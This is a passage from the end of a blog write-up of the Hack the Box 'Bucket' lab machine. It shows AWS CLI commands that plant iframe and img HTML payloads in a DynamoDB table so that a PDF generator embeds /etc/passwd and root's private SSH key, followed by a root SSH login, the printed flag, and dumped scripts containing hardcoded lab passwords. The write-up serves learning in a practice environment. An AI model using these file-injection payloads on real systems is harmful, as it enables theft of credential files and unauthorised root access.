                </span><span class="nl">"KeyType"</span><span class="p">:</span><span class="w"> </span><span class="s2">"RANGE"</span><span class="w">
            </span><span class="p">}</span><span class="w">
        </span><span class="p">],</span><span class="w">
        </span><span class="nl">"TableStatus"</span><span class="p">:</span><span class="w"> </span><span class="s2">"ACTIVE"</span><span class="p">,</span><span class="w">
        </span><span class="nl">"CreationDateTime"</span><span class="p">:</span><span class="w"> </span><span class="mf">1615775665.193</span><span class="p">,</span><span class="w">
        </span><span class="nl">"ProvisionedThroughput"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
            </span><span class="nl">"LastIncreaseDateTime"</span><span class="p">:</span><span class="w"> </span><span class="mf">0.0</span><span class="p">,</span><span class="w">
            </span><span class="nl">"LastDecreaseDateTime"</span><span class="p">:</span><span class="w"> </span><span class="mf">0.0</span><span class="p">,</span><span class="w">
            </span><span class="nl">"NumberOfDecreasesToday"</span><span class="p">:</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w">
            </span><span class="nl">"ReadCapacityUnits"</span><span class="p">:</span><span class="w"> </span><span class="mi">10</span><span class="p">,</span><span class="w">
            </span><span class="nl">"WriteCapacityUnits"</span><span class="p">:</span><span class="w"> </span><span class="mi">10</span><span class="w">
        </span><span class="p">},</span><span class="w">
        </span><span class="nl">"TableSizeBytes"</span><span class="p">:</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w">
        </span><span class="nl">"ItemCount"</span><span class="p">:</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w">
        </span><span class="nl">"TableArn"</span><span class="p">:</span><span class="w"> </span><span class="s2">"arn:aws:dynamodb:us-east-1:000000000000:table/alerts"</span><span class="w">
    </span><span class="p">}</span><span class="w">
</span><span class="p">}</span><span class="w">
</span></pre></table></code></div></div><p>It looked like I had successfully created the table.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre>┌──(zweilos㉿kali)-[~/htb/bucket]
└─$ aws dynamodb put-item \    
    --table-name alerts \
    --item '{                
        "title": {"S": "Ransomware"},                                           
        "data": {"S": "&lt;html&gt;&lt;head&gt;&lt;/head&gt;&lt;body&gt;&lt;img src='/etc/passwd'&gt;&lt;/img&gt;&lt;/body&gt;&lt;/html&gt;"}
      }' \                                                                 
    --return-consumed-capacity TOTAL --endpoint-url http://s3.bucket.htb
</pre></table></code></div></div><p>Next I created the item in the database that matched what the PHP script was looking for. I set the <code class="language-plaintext highlighter-rouge">title</code> attribute to be <code class="language-plaintext highlighter-rouge">Ransomware</code>. For the data field I had to make sure that it contained HTML code. As a test I made it load <code class="language-plaintext highlighter-rouge">/etc/passwd</code> to make sure it worked.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/markups/bucket-iframe.svg" alt="I had to do my local file injection attack using an iframe rather than in an image tag" /></p><div class="language-json highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre><span class="p">{</span><span class="w">
    </span><span class="nl">"ConsumedCapacity"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
        </span><span class="nl">"TableName"</span><span class="p">:</span><span class="w"> </span><span class="s2">"alerts"</span><span class="p">,</span><span class="w">
        </span><span class="nl">"CapacityUnits"</span><span class="p">:</span><span class="w"> </span><span class="mf">1.0</span><span class="w">
    </span><span class="p">}</span><span class="w">
</span><span class="p">}</span><span class="w">
</span></pre></table></code></div></div><p>After inserting my data into the table I got back a reply that simple said that I had consumed 1.0 “CapacityUnits”.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>roy@bucket:/var/www/bucket-app/files$ curl --data "action=get_alerts" http://localhost:8000/
</pre></table></code></div></div><p>I used <code class="language-plaintext highlighter-rouge">curl</code> to connect to the endpoint to trigger the PHP script to pull the data from the database and make the PDF file in <code class="language-plaintext highlighter-rouge">/var/www/bucket-app/files/</code>.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>roy@bucket:/var/www/bucket-app/files$ python3 -m http.server 8090
Serving HTTP on 0.0.0.0 port 8090 (http://0.0.0.0:8090/) ...
10.10.14.158 - - [15/Mar/2021 02:49:49] "GET /result.pdf HTTP/1.1" 200 -
</pre></table></code></div></div><p>I used Python to host an HTTP server to serve the PDF file externally.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre><td class="rouge-code"><pre>┌──(zweilos㉿kali)-[~]
└─$ wget http://10.10.10.212:8090/result.pdf
--2021-03-14 22:40:00--  http://10.10.10.212:8090/result.pdf
Connecting to 10.10.10.212:8090... connected.
HTTP request sent, awaiting response... 200 OK
Length: 1400 (1.4K) [application/pdf]
Saving to: ‘result.pdf’

result.pdf                100%[====================================&gt;]   1.37K  --.-KB/s    in 0s      

2021-03-14 22:40:00 (26.2 MB/s) - ‘result.pdf’ saved [1400/1400]
</pre></table></code></div></div><p>And using <code class="language-plaintext highlighter-rouge">wget</code> on my machine I was able to download the PDF file. This whole cycle had to be repeated many times as the files folder and the database table were cleared regularly and often.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/bucket-5-passwd.png" alt="A PDF file with the contents of /etc/passwd in it" /></p><p>After getting the correct file I opened it and found that it did indeed contain the contents of <code class="language-plaintext highlighter-rouge">/etc/passwd</code>.</p><h3 id="getting-roots-ssh-key">Getting <code class="language-plaintext highlighter-rouge">root</code>’s SSH key</h3><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre>┌──(zweilos㉿kali)-[~/htb/bucket]
└─$ aws dynamodb put-item \    
    --table-name alerts \
    --item '{                
        "title": {"S": "Ransomware"},                                           
        "data": {"S": "&lt;html&gt;&lt;head&gt;&lt;/head&gt;&lt;body&gt;&lt;iframe src='/root/.ssh/id_rsa'&gt;&lt;/iframe&gt;&lt;/body&gt;&lt;/html&gt;"}
      }' \                                                                 
    --return-consumed-capacity TOTAL --endpoint-url http://s3.bucket.htb
</pre></table></code></div></div><p>I again added an item to the database, this time trying to see if I could get <code class="language-plaintext highlighter-rouge">root</code>’s SSH private key.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre>{
    "ConsumedCapacity": {
        "TableName": "alerts",
        "CapacityUnits": 1.0
    }
}
</pre></table></code></div></div><p>I got back the same result message about consuming units. I went through the same steps as with the <code class="language-plaintext highlighter-rouge">/etc/passwd</code> PDF using <code class="language-plaintext highlighter-rouge">curl</code>, Python, and <code class="language-plaintext highlighter-rouge">wget</code> to create, host, and exfiltrate the file back to my machine.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/bucket-5-root-ssh.png" alt="A PDF file containing the contents of root's private SSH key" /></p><p>After opening the PDF file, I found that I now had <code class="language-plaintext highlighter-rouge">root</code>’s private SSH key. I copied the contents to a blank file and named it <code class="language-plaintext highlighter-rouge">root.key</code>.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
</pre><td class="rouge-code"><pre>┌──(zweilos㉿kali)-[~/htb/bucket]
└─$ ssh root@10.10.10.212 -i root.key        
The authenticity of host '10.10.10.212 (10.10.10.212)' can't be established.
ECDSA key fingerprint is SHA256:7+5qUqmyILv7QKrQXPArj5uYqJwwe7mpUbzD/7cl44E.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.10.212' (ECDSA) to the list of known hosts.
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@         WARNING: UNPROTECTED PRIVATE KEY FILE!          @
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
Permissions 0644 for 'root.key' are too open.
It is required that your private key files are NOT accessible by others.
This private key will be ignored.
Load key "root.key": bad permissions
root@10.10.10.212's password: 

                                                                                                       
┌──(zweilos㉿kali)-[~/htb/bucket]
└─$ chmod 600 root.key
</pre></table></code></div></div><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/markups/bucket-key.svg" alt="Protect your private keys!" /></p><h3 id="roottxt">Root.txt</h3><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
</pre><td class="rouge-code"><pre>┌──(zweilos㉿kali)-[~/htb/bucket]
└─$ ssh root@10.10.10.212 -i root.key
Welcome to Ubuntu 20.04 LTS (GNU/Linux 5.4.0-48-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Mon 15 Mar 2021 03:09:12 AM UTC

  System load:                      0.01
  Usage of /:                       33.6% of 17.59GB
  Memory usage:                     28%
  Swap usage:                       0%
  Processes:                        261
  Users logged in:                  0
  IPv4 address for br-bee97070fb20: 172.18.0.1
  IPv4 address for docker0:         172.17.0.1
  IPv4 address for ens160:          10.10.10.212
  IPv6 address for ens160:          dead:beef::250:56ff:feb9:654c

 * Kubernetes 1.19 is out! Get it in one command with:

     sudo snap install microk8s --channel=1.19 --classic

   https://microk8s.io/ has docs and details.

229 updates can be installed immediately.
103 of these updates are security updates.
To see these additional updates run: apt list --upgradable


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Tue Feb  9 14:39:03 2021
root@bucket:~# id &amp;&amp; hostname
uid=0(root) gid=0(root) groups=0(root)
bucket
root@bucket:~# ls -la
total 76
drwx------ 11 root root 4096 Sep 24 04:09 .
drwxr-xr-x 21 root root 4096 Feb 10 12:49 ..
drwxr-xr-x  2 root root 4096 Sep 23 03:19 .aws
drwxr-xr-x  3 root root 4096 Sep 16 12:47 backups
lrwxrwxrwx  1 root root    9 Sep  4  2020 .bash_history -&gt; /dev/null
-rw-r--r--  1 root root 3106 Dec  5  2019 .bashrc
drwx------  3 root root 4096 Sep 23 04:35 .cache
drwxr-xr-x  3 root root 4096 Sep 21 12:46 .config
-rw-r--r--  1 root root  217 Sep 24 02:18 docker-compose.yml
drwxr-xr-x  7 root root 4096 Mar 15 03:10 files
drwxr-xr-x  3 root root 4096 Sep 21 12:36 .java
drwxr-xr-x  3 root root 4096 Sep 24 02:21 .local
-rw-r--r--  1 root root  161 Dec  5  2019 .profile
-rwxr-xr-x  1 root root 1694 Sep 24 04:09 restore.php
-rwxr-xr-x  1 root root  381 Sep 24 02:33 restore.sh
-r--------  1 root root   33 Mar 15 00:51 root.txt
drwxr-xr-x  3 root root 4096 May 18  2020 snap
drwx------  2 root root 4096 Sep 21 11:44 .ssh
-rwxr-xr-x  1 root root  340 Sep 24 02:40 start.sh
-rwxr-xr-x  1 root root  182 Sep 24 02:08 sync.sh
</pre></table></code></div></div><p>A setting up the key and logging into the machine using SSH, I was logged in a <code class="language-plaintext highlighter-rouge">root</code>. In the <code class="language-plaintext highlighter-rouge">/root</code> directory I saw a few automation scripts that probably were causing all of the redundant work earlier…</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>root@bucket:~# cat root.txt
57aa1314cfc55966d346fab64d381711
</pre></table></code></div></div><p>First, I collected my proof.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
</pre><td class="rouge-code"><pre>root@bucket:~# cat start.sh 
#!/bin/bash
cd /root &amp;&amp;  docker-compose up -d
sleep 20
aws --endpoint-url=http://localhost:4566 s3 mb s3://adserver
aws --endpoint-url=http://localhost:4566 s3 sync /root/backups s3://adserver
sleep 20
aws --endpoint-url=http://localhost:4566 s3 mb s3://adserver
aws --endpoint-url=http://localhost:4566 s3 sync /root/backups s3://adserver
root@bucket:~# cat restore.sh 
#!/bin/bash
sleep 60
aws --endpoint-url=http://localhost:4566 s3 rm s3://adserver --recursive
aws --endpoint-url=http://localhost:4566 s3 rb s3://adserver
aws --endpoint-url=http://localhost:4566 s3 mb s3://adserver
aws --endpoint-url=http://localhost:4566 s3 sync /root/backups/ s3://adserver
rm -rf /var/www/html/*
cp -R /root/backups/index.html /var/www/html/
/root/restore.php
root@bucket:~# cat sync.sh 
#!/bin/bash

rm -rf /root/files/*
aws --endpoint-url=http://localhost:4566 s3 sync s3://adserver/ /root/files/ --exclude "*.png" --exclude "*.jpg"
cp -R /root/files/* /var/www/html/
</pre></table></code></div></div><p>After looking through the scripts, I saw that I was correct. These scripts were set up to clear files and keep things running smoothly on the machine since it was most likely being exploited by multiple users at the same time.</p><div class="language-php highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
</pre><td class="rouge-code"><pre>root@bucket:~# cat restore.php 
#!/usr/bin/php
<span class="cp">&lt;?php</span>
<span class="k">require</span> <span class="s1">'/var/www/bucket-app/vendor/autoload.php'</span><span class="p">;</span>
<span class="nb">date_default_timezone_set</span><span class="p">(</span><span class="s1">'America/New_York'</span><span class="p">);</span>
<span class="kn">use</span> <span class="nc">Aws\DynamoDb\DynamoDbClient</span><span class="p">;</span>
<span class="kn">use</span> <span class="nc">Aws\DynamoDb\Exception\DynamoDbException</span><span class="p">;</span>

<span class="nv">$client</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Aws\Sdk</span><span class="p">([</span>
    <span class="s1">'profile'</span> <span class="o">=&gt;</span> <span class="s1">'default'</span><span class="p">,</span>
    <span class="s1">'region'</span>  <span class="o">=&gt;</span> <span class="s1">'us-east-1'</span><span class="p">,</span>
    <span class="s1">'version'</span> <span class="o">=&gt;</span> <span class="s1">'latest'</span><span class="p">,</span>
    <span class="s1">'endpoint'</span> <span class="o">=&gt;</span> <span class="s1">'http://localhost:4566'</span>
<span class="p">]);</span>

<span class="nv">$dynamodb</span> <span class="o">=</span> <span class="nv">$client</span><span class="o">-&gt;</span><span class="nf">createDynamoDb</span><span class="p">();</span>
<span class="nv">$params</span> <span class="o">=</span> <span class="p">[</span>
    <span class="s1">'TableName'</span> <span class="o">=&gt;</span> <span class="s1">'alerts'</span>
<span class="p">];</span>
<span class="nv">$tableName</span><span class="o">=</span><span class="s1">'users'</span><span class="p">;</span>
<span class="k">try</span> <span class="p">{</span>
<span class="nv">$response</span> <span class="o">=</span> <span class="nv">$dynamodb</span><span class="o">-&gt;</span><span class="nf">createTable</span><span class="p">([</span>
        <span class="s1">'TableName'</span> <span class="o">=&gt;</span> <span class="nv">$tableName</span><span class="p">,</span>
        <span class="s1">'AttributeDefinitions'</span> <span class="o">=&gt;</span> <span class="p">[</span>
                <span class="p">[</span>
                        <span class="s1">'AttributeName'</span> <span class="o">=&gt;</span> <span class="s1">'username'</span><span class="p">,</span>
                        <span class="s1">'AttributeType'</span> <span class="o">=&gt;</span> <span class="s1">'S'</span>
                <span class="p">],</span>
                <span class="p">[</span>
                        <span class="s1">'AttributeName'</span> <span class="o">=&gt;</span> <span class="s1">'password'</span><span class="p">,</span>
                        <span class="s1">'AttributeType'</span> <span class="o">=&gt;</span> <span class="s1">'S'</span>
                <span class="p">]</span>
        <span class="p">],</span>
        <span class="s1">'KeySchema'</span> <span class="o">=&gt;</span> <span class="p">[</span>
                <span class="p">[</span>
                        <span class="s1">'AttributeName'</span> <span class="o">=&gt;</span> <span class="s1">'username'</span><span class="p">,</span>
                        <span class="s1">'KeyType'</span> <span class="o">=&gt;</span> <span class="s1">'HASH'</span>
                <span class="p">],</span>
                <span class="p">[</span>
                        <span class="s1">'AttributeName'</span> <span class="o">=&gt;</span> <span class="s1">'password'</span><span class="p">,</span>
                        <span class="s1">'KeyType'</span> <span class="o">=&gt;</span> <span class="s1">'RANGE'</span>
                <span class="p">]</span>
        <span class="p">],</span>
        <span class="s1">'ProvisionedThroughput'</span> <span class="o">=&gt;</span> <span class="p">[</span>
             <span class="s1">'ReadCapacityUnits'</span>    <span class="o">=&gt;</span> <span class="mi">5</span><span class="p">,</span>
             <span class="s1">'WriteCapacityUnits'</span> <span class="o">=&gt;</span> <span class="mi">5</span>
        <span class="p">]</span>
<span class="p">]);</span>

<span class="nv">$response</span> <span class="o">=</span> <span class="nv">$dynamodb</span><span class="o">-&gt;</span><span class="nf">putItem</span><span class="p">(</span><span class="k">array</span><span class="p">(</span>
    <span class="s1">'TableName'</span> <span class="o">=&gt;</span> <span class="nv">$tableName</span><span class="p">,</span> 
    <span class="s1">'Item'</span> <span class="o">=&gt;</span> <span class="k">array</span><span class="p">(</span>
        <span class="s1">'username'</span>   <span class="o">=&gt;</span> <span class="k">array</span><span class="p">(</span><span class="s1">'S'</span> <span class="o">=&gt;</span> <span class="s1">'Cloudadm'</span><span class="p">),</span>
        <span class="s1">'password'</span>  <span class="o">=&gt;</span> <span class="k">array</span><span class="p">(</span><span class="s1">'S'</span> <span class="o">=&gt;</span> <span class="s1">'Welcome123!'</span><span class="p">)</span>
    <span class="p">)</span>
<span class="p">));</span>

<span class="nv">$response</span> <span class="o">=</span> <span class="nv">$dynamodb</span><span class="o">-&gt;</span><span class="nf">putItem</span><span class="p">(</span><span class="k">array</span><span class="p">(</span>
    <span class="s1">'TableName'</span> <span class="o">=&gt;</span> <span class="nv">$tableName</span><span class="p">,</span> 
    <span class="s1">'Item'</span> <span class="o">=&gt;</span> <span class="k">array</span><span class="p">(</span>
        <span class="s1">'username'</span>   <span class="o">=&gt;</span> <span class="k">array</span><span class="p">(</span><span class="s1">'S'</span> <span class="o">=&gt;</span> <span class="s1">'Mgmt'</span><span class="p">),</span>
        <span class="s1">'password'</span>  <span class="o">=&gt;</span> <span class="k">array</span><span class="p">(</span><span class="s1">'S'</span> <span class="o">=&gt;</span> <span class="s1">'Management@#1@#'</span><span class="p">)</span>
    <span class="p">)</span>
<span class="p">));</span>

<span class="nv">$response</span> <span class="o">=</span> <span class="nv">$dynamodb</span><span class="o">-&gt;</span><span class="nf">putItem</span><span class="p">(</span><span class="k">array</span><span class="p">(</span>
    <span class="s1">'TableName'</span> <span class="o">=&gt;</span> <span class="nv">$tableName</span><span class="p">,</span> 
    <span class="s1">'Item'</span> <span class="o">=&gt;</span> <span class="k">array</span><span class="p">(</span>
        <span class="s1">'username'</span>   <span class="o">=&gt;</span> <span class="k">array</span><span class="p">(</span><span class="s1">'S'</span> <span class="o">=&gt;</span> <span class="s1">'Sysadm'</span><span class="p">),</span>
        <span class="s1">'password'</span>  <span class="o">=&gt;</span> <span class="k">array</span><span class="p">(</span><span class="s1">'S'</span> <span class="o">=&gt;</span> <span class="s1">'n2vM-&lt;_K_Q:.Aa2'</span><span class="p">)</span>
    <span class="p">)</span>
<span class="p">));}</span>
<span class="k">catch</span><span class="p">(</span><span class="nc">Exception</span> <span class="nv">$e</span><span class="p">)</span> <span class="p">{</span>
  <span class="k">echo</span> <span class="s1">'Message: '</span> <span class="mf">.</span><span class="nv">$e</span><span class="o">-&gt;</span><span class="nf">getMessage</span><span class="p">();</span>
<span class="p">}</span>
<span class="nv">$result</span> <span class="o">=</span> <span class="nv">$dynamodb</span><span class="o">-&gt;</span><span class="nf">deleteTable</span><span class="p">(</span><span class="nv">$params</span><span class="p">);</span>
</pre></table></code></div></div><p>This php file automated the creation and set up of the database tables with all of the juicy information I had found in the <code class="language-plaintext highlighter-rouge">users</code> table.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/bucket-0-pwned.png" alt="Hack the Box popup message showing proof that I had finished this machine" /></p><p>Thanks to <a href="https://app.hackthebox.eu/users/13531"><code class="language-plaintext highlighter-rouge">MrR3boot</code></a> for exploring this topic of cloud enumeration and attack. This is a difficult topic to cover with Hack the Box, since each machine needs to be self-contained, but this instance was a great way to learn about the AWS CLI and how to use it to enumerate S3 buckets.</p><p>If you have comments, issues, or other feedback, or have any other fun or useful tips or tricks to share, feel free to contact me on Github at <a href="https://github.com/zweilosec">https://github.com/zweilosec</a> or in the comments below!</p><p>If you like this content and would like to see more, please consider buying me a coffee! <a href="https://www.buymeacoffee.com/zweilosec"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://img.buymeacoffee.com/button-api/?text=Buy me a coffee&amp;emoji=&amp;slug=zweilosec&amp;button_colour=FFDD00&amp;font_colour=000000&amp;font_family=Lato&amp;outline_colour=000000&amp;coffee_colour=ffffff" /></a></p></div><script data-name="BMC-Widget" data-cfasync="false" src="https://cdnjs.buymeacoffee.com/1.0.0/widget.prod.min.js" data-id="zweilosec" data-description="Support me on Buy me a coffee!" data-message="If you like this content and would like to see more, please consider buying me a coffee!" data-color="#FFDD00" data-position="Right" data-x_margin="18" data-y_margin="18"></script><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/hack-the-box/'>Hack the Box</a>, <a href='/categories/writeup/'>Writeup</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/htb/" class="post-tag no-text-decoration" >htb</a> <a href="/tags/hacking/" class="post-tag no-text-decoration" >hacking</a> <a href="/tags/hack-the-box/" class="post-tag no-text-decoration" >hack the box</a> <a href="/tags/linux/" class="post-tag no-text-decoration" >linux</a> <a href="/tags/aws/" class="post-tag no-text-decoration" >aws</a> <a href="/tags/dynamodb/" class="post-tag no-text-decoration" >dynamodb</a> <a href="/tags/s3/" class="post-tag no-text-decoration" >s3</a> <a href="/tags/pdf/" class="post-tag no-text-decoration" >pdf</a> <a href="/tags/php/" class="post-tag no-text-decoration" >php</a> <a href="/tags/lfi/" class="post-tag no-text-decoration" >lfi</a> <a href="/tags/mrr3boot/" class="post-tag no-text-decoration" >mrr3boot</a> <a href="/tags/medium/" class="post-tag no-text-decoration" >medium</a> <a href="/tags/writeup/" class="post-tag no-text-decoration" >writeup</a> <a href="/tags/redteam/" class="post-tag no-text-decoration" >redteam</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Hack The Box - Bucket Writeup - Hacker's Rest&url=https://zweilosec.github.io/posts/bucket/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Hack The Box - Bucket Writeup - Hacker's Rest&u=https://zweilosec.github.io/posts/bucket/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=Hack The Box - Bucket Writeup - Hacker's Rest&url=https://zweilosec.github.io/posts/bucket/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i class="fa-fw fas fa-link small" onclick="copyLink()" data-toggle="tooltip" data-placement="top" title="Copy link"></i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-lastmod" class="post"> <span>Recent Update</span><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/upgrade-linux-shell/">Upgrade a linux reverse shell to a fully usable TTY shell</a><li><a href="/posts/late/">Hack The Box - Late Writeup</a><li><a href="/posts/acute/">Hack The Box - Acute Writeup</a><li><a href="/posts/jekyll-chirpy-github-pages-blog/">How to use GitHub Pages to host a blog with Jekyll Chirpy theme</a><li><a href="/posts/zip-unzip-files-powershell/">How to Zip and Unzip Files Using PowerShell</a></ul></div><div id="access-tags"> <span>Trending Tags</span><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/hacking/">hacking</a> <a class="post-tag" href="/tags/hack-the-box/">hack the box</a> <a class="post-tag" href="/tags/htb/">htb</a> <a class="post-tag" href="/tags/redteam/">redteam</a> <a class="post-tag" href="/tags/writeup/">writeup</a> <a class="post-tag" href="/tags/web/">web</a> <a class="post-tag" href="/tags/linux/">linux</a> <a class="post-tag" href="/tags/unfinished/">unfinished</a> <a class="post-tag" href="/tags/oscp/">oscp</a> <a class="post-tag" href="/tags/tj-null/">tj_null</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"> <span class="pl-3 pt-2 mb-2">Contents</span><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"> <script src="https://utteranc.es/client.js" repo="zweilosec/zweilosec.github.io" issue-term="title" label="comments 💬" theme="github-dark" crossorigin="anonymous" async> </script><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/book/"><div class="card-body"> <span class="timeago small" > Jun 8, 2020 <i class="unloaded">2020-06-08T14:00:00+00:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hack the Box - Book Writeup</h3><div class="text-muted small"><p> HTB - Book Overview A medium Linux box that was fairly straightforward, but still challenging enough to teach some interesting use cases for ‘standard’ attacks. This machine is on TJ_Null’s lis...</p></div></div></a></div><div class="card"> <a href="/posts/quick/"><div class="card-body"> <span class="timeago small" > Aug 20, 2020 <i class="unloaded">2020-08-20T14:00:00+00:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hack the Box - Quick Writeup</h3><div class="text-muted small"><p> HTB - Quick Overview This machine is on TJ_Null’s list of OSCP-like machines. Have fun! Short description to include any strange things to be dealt with Useful Skills and Tools Connecting to...</p></div></div></a></div><div class="card"> <a href="/posts/playertwo/"><div class="card-body"> <span class="timeago small" > Jun 26, 2020 <i class="unloaded">2020-06-26T14:00:00+00:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hack the Box - PlayerTwo Writeup</h3><div class="text-muted small"><p> HTB - PlayerTwo Overview An Insane difficulty Linux machine that tested my web skills quite a bit and also had me doing as much research on new protocols and services as three or four easy or m...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/reel2/" class="btn btn-outline-primary" prompt="Older"><p>Hack the Box - Reel2 Writeup</p></a> <a href="/posts/time/" class="btn btn-outline-primary" prompt="Newer"><p>Hack the Box - Time Writeup</p></a></div></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"><p class="mb-0"> © 2023 <a href="https://twitter.com/zweilosec">zweilosec</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Trending Tags</h4><a class="post-tag" href="/tags/hacking/">hacking</a> <a class="post-tag" href="/tags/hack-the-box/">hack the box</a> <a class="post-tag" href="/tags/htb/">htb</a> <a 